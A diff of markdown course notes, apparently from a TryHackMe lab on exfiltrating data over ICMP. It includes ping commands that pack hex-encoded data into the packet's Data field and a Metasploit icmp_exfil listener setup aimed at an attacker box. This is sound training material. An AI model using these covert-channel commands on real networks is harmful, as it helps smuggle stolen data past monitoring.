@@ -1,8 +1,8 @@
 # Exfiltration using ICMP
 
-In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking) https://tryhackme.com/room/whatisnetworking. 
+In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking) or visit: https://tryhackme.com/room/whatisnetworking. 
 
-Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the **`{color:red}ping{/color}`** command to send **`ICMP`** packets through the network, as shown in the figure below:
+Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the **`ping`** command to send **`ICMP`** packets through the network, as shown in the figure below:
 
 ![image](https://github.com/user-attachments/assets/a4cbaf82-22f5-42df-aa28-3b03d4666d31)<br>
 #### ICMP Request and Reply Diagram<br>
@@ -13,19 +13,17 @@ The **`HOST1`** sends an ICMP packet with an **echo-request** packet. Then, if *
 
 On a high level, the **`ICMP`** packet's structure contains a **`Data`** section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the **`Data`** section, which is optional to use.<br>
 ![image](https://github.com/user-attachments/assets/4f8bf4a9-c0e7-4af1-83c1-50c60fa45e30)
-###### ICMP Packet Structure Diagram
-
-<br>
-
+###### ICMP Packet Structure Diagram  
+  
 Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the **`Data`** section and send it via **`ICMP`** packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.
 
 To perform manual ICMP data exfiltration, we need to discuss the **`ping`** command a bit more. The **`ping`** command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending **`ICMP`** packets, which can be used as follows:
-<br>
-``bash
+
+```bash
 #Sending one ICMP packet using the PING Command:
 thm@AttackBox$ ping 10.10.144.103 -c 1
-``
-<br>
+```
+
 We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:
 <br>
 ![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d) 
@@ -53,15 +51,15 @@ root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
 ```
 
 ##### **or for a one-liner:**
-``bash
+```bash
 ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
-``
+```
 <br>
 We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.
 
 ![image](https://github.com/user-attachments/assets/31800a6e-1ce0-4b93-b8b2-b87be4c2cd94)
 #### Checking Data Field in Wireshark Screenshot
-<br>
+
 Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command.
 
 <br>
@@ -72,14 +70,17 @@ Now that we have the basic fundamentals of manually sending data over ICMP packe
 ![image](https://github.com/user-attachments/assets/84f53917-1a90-4917-8f9c-913263876bd5)
 #### ICMP Data Exfiltration Diagram
 
-<br>
+
 Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the **`BPF_FILTER`** option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as <red>follows</red>:
 
-Set the BPF_FILTER in MSF 
+```bash
+#Set the BPF_FILTER in MSF:
 msf5 > use auxiliary/server/icmp_exfil
 msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
 BPF_FILTER => icmp and not src ATTACKBOX_IP
-We also need to select which network interface to listen to, eth0. Finally, executes run to start the module.
+```
+
+We also need to select which network interface to listen to, **`<red>eth0</red>`**. Finally, <red>executes</red> run to start the module.
 
 Set the interface in MSF
 msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
